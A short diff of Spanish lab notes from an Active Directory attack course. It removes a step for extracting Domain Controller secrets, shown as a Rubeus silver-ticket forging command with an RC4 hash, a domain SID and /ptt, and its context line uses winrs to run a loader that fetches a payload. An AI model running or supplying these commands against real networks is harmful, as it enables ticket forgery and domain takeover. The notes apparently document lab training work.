@@ -617,7 +617,3 @@ winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Safet
 
 *LO -08*
 ## Extraer los secrets de un Domain Controller
-A partir de la información recopilada en la maquina anterior, hemos obtenido el hash del controlador de dominio *dcorp-dc$*
-```shell
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
-```
